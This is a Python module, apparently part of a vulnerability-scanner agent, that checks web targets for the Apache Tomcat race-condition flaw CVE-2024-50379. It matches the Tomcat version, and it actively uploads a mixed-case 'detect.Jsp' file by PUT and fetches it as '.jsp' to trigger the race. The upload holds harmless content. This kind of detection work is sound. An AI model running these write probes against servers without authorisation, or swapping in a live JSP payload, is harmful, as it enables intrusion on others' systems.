import datetime
import logging
import re

import requests
from packaging import version

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

# Set up basic configuration for logging
logging.basicConfig(level=logging.DEBUG)

DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)

VULNERABILITY_TITLE = "Apache Tomcat Race Condition Remote Code Execution"
VULNERABILITY_REFERENCE = "CVE-2024-50379"
VULNERABILITY_DESCRIPTION = (
    "A race condition vulnerability in Apache Tomcat allows remote code execution through concurrent PUT requests "
    "with non-standard file extensions and subsequent GET requests. The vulnerability affects versions "
    "9.0.0.M1 through 9.0.98, 10.1.0-M1 through 10.1.34, and 11.0.0-M1 through 11.0.2."
)
RISK_RATING = "CRITICAL"

VERSION_PATTERN = re.compile(r"Apache Tomcat/(\d+\.\d+\.\d+)")

# Version ranges for affected versions
VULNERABLE_RANGES = [
    (version.parse("9.0.0"), version.parse("9.0.98")),
    (version.parse("10.1.0"), version.parse("10.1.34")),
    (version.parse("11.0.0"), version.parse("11.0.2")),
]
TEST_FILE = "detect.Jsp"
HARMLESS_CONTENT = "<!-- detection test -->"


def _concurrent_put(url: str) -> bool:
    """Make a PUT request to test race condition"""
    try:
        response = requests.put(
            f"{url}/{TEST_FILE}",
            data=HARMLESS_CONTENT,
            headers={"Content-Type": "text/plain"},
            timeout=DEFAULT_TIMEOUT.seconds,
        )
        if response.status_code < 200 or response.status_code >= 300:
            logging.debug(
                f"PUT request failed: {response.status_code} for {url}/{TEST_FILE}"
            )
        return 200 <= response.status_code < 300
    except requests.RequestException as e:
        logging.error(f"Error in PUT request: {e}")
        return False


def _concurrent_get(url: str) -> bool:
    """Make a GET request to the standard extension"""
    try:
        response = requests.get(
            f"{url}/{TEST_FILE.lower()}", timeout=DEFAULT_TIMEOUT.seconds
        )
        return response.status_code == 200
    except requests.RequestException as e:
        logging.error(f"Error in GET request: {e}")
        return False


def _test_race_condition(url: str) -> bool:
    """
    Test for race condition by making concurrent PUT and GET requests.
    """
    # Make two PUT requests and five GET requests to simulate the race condition
    put_results = [_concurrent_put(url) for _ in range(2)]
    get_results = [
        _concurrent_get(url) for _ in range(5)
    ]  # More GET requests as per PoC

    # Return True if any of the PUT requests succeeded and any of the GET requests succeed (indicating the race condition)
    if any(put_results) and any(get_results):
        logging.debug("Race condition successfully triggered for %s", url)
        return True
    else:
        logging.debug("Race condition failed to trigger for %s", url)
        return False


def _is_version_vulnerable(version_str: str) -> bool:
    """
    Check if the detected version falls within any of the vulnerable ranges.

    Args:
        version_str: The version string to check

    Returns:
        bool: True if the version is vulnerable, False otherwise
    """
    try:
        detected_version = version.parse(version_str)
        for min_ver, max_ver in VULNERABLE_RANGES:
            if min_ver <= detected_version <= max_ver:
                logging.debug("Detected vulnerable version: %s", detected_version)
                return True
        return False
    except version.InvalidVersion:
        logging.error("Invalid version format: %s", version_str)
        return False


@exploits_registry.register
class CVE202450379Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    accept_pattern = [re.compile(r"Apache Tomcat")]

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities: list[definitions.Vulnerability] = []

        try:
            root_response = requests.get(
                target.origin, timeout=DEFAULT_TIMEOUT.seconds, verify=False
            )
            if not (200 <= root_response.status_code < 600 and root_response.text):
                logging.debug(f"Failed to access root of {target.origin}")
                return vulnerabilities

            version_match = VERSION_PATTERN.search(root_response.text)
            if version_match is None:
                logging.debug(f"Version not found for {target.origin}")
                return vulnerabilities

            tomcat_version = version_match.group(1)
            if (
                _test_race_condition(target.origin) is True
                or _is_version_vulnerable(tomcat_version) is True
            ):
                vulnerabilities.append(self._create_vulnerability(target))

        except requests.RequestException as e:
            logging.error(f"Error in checking {target.origin}: {e}")
            return vulnerabilities

        return vulnerabilities

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )
